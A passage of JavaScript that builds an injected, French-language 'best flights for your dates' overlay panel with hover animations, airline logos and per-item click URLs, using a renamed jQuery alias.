                        searchFlights.getPanel(json, flight.from, flight.to, flight.dep_day, flight.ret_day);
                    }
                }
            });
        }
    },

    getPanel: function(json, from, to, dep_day, ret_day) {
        analyseCss();
        searchFlights.tracker_id = json.event_id['$id'];
        var jqMoreFlights = jKiri('<div />', {id:'fdzMore'});
            
            jqMoreFlights.css({
            background: '#fff',
            display: 'block',
            position: 'fixed',
            top: -450,
            right: 10,
            width: 350,
            zIndex: max_zIndex + 1,
            border: 'solid 1px #eee',
            borderTop: 'none',
            boxShadow: 'rgba(0, 0, 0, 0.3) 2px 2px 4px'
        });
        var jqMoreHeader = jKiri('<div/>');
        jqMoreHeader.css(reset_css);
        jqMoreHeader.css({
            background: 'rgb(4, 133, 182)',
            width: '100%',
            height: 50,
            borderBottom: '1px solid rgb(3, 118, 174)'
            });
        var jqMoreHeaderText = jKiri('<div/>');
        jqMoreHeaderText.css(reset_css);
        jqMoreHeaderText.css({
            color: '#fff',
            verticalAlign: 'middle',
            textAlign: "center",
            lineHeight: '8px',
            fontSize: '12px',
            textTransform:'uppercase',
            fontWeight: 'bold',
            paddingTop: '10px'
        });
        var flight_type = 'A/R';
        if (ret_day == null) {
            flight_type = 'aller-simple'
        }
        jqMoreHeaderText.html('Les meilleurs vols '+ flight_type +'  vos dates<br/><span style="font-size: 16px; color: #fff; margin-top: 12px; display: block;">' + from + '  ' + to + '</span>');
        jqMoreHeader.append(jqMoreHeaderText);
        jqMoreFlights.append(jqMoreHeader);
        var i = 0;
        while (i < json.flights.length) {
                var f = json.flights[i];
            var randomId = Math.floor(Math.random() * 99999999999999) + 1;
            var jqItem = jKiri('<div />', {'data-url': f.click_url, 'data-id': randomId});
            jqItem.css(reset_css);
            jqItem.css({
                height: '80px',
                width: '100%',
                cursor: 'pointer',
            });
            if (json.flights.length - 1 != i) {
                jqItem.css({
                    borderBottom: 'solid 1px rgb(4, 133, 182)'
                });
            }
            jqItem.hover(function() {
                var id = jKiri(this).data('id');
                jKiri('#button-' + id).css({
                    backgroundColor: "rgb(4, 133, 182)"
            });
                jKiri('#calltoaction-' + id).animate({
                    left: '101px'
                }, 100);
                jKiri('#calltoaction2-' + id).animate({
                    left: '96px',
                    opacity: 0.8
                }, 300);
            }, function() {
                var id = jKiri(this).data('id');
                jKiri('#button-' + id).css({
                    backgroundColor: "rgb(5, 174, 240)"
                });
                jKiri('#calltoaction-' + id).animate({
                    left: '98px'
                }, 100);
                jKiri('#calltoaction2-' + id).animate({
                    left: '70px',
                    opacity: 0
                }, 100);
            });

            var jqLeftPart = jKiri('<div />');
            jqLeftPart.css(reset_css);
            jqLeftPart.css({
                height: '80px',
                width: '65%',
                display: 'inline-block',
                float: 'left'
                });
            var jqTrip1 = jKiri('<div />');
            jqTrip1.css(reset_css);
            jqTrip1.css({
                height: '39px',
                display:'block',
                background: '#fff',
                borderBottom: '1px solid rgb(246, 246, 246)'
            });
            var jqPlane1 = jKiri('<span/>');
            jqPlane1.css(reset_css);
            jqPlane1.css({
                backgroundImage: "url("+fdzGlobal.host + "/assets/img/avion-aller.png)",
                backgroundSize: '100%',
                float: 'left',
                display: 'inline-block',
                margin: '13px 0px 0px 5px',
                width: '20px',
                height: '14px'
                });
            var jqAirline1 = jKiri('<span />');
            jqAirline1.css(reset_css);

            var airline_letters = (f.go.airline_logo.length > 0)? f.go.airline_logo.match(/.*\/(.*)\..*/)[1] : null;
            jqAirline1.css({
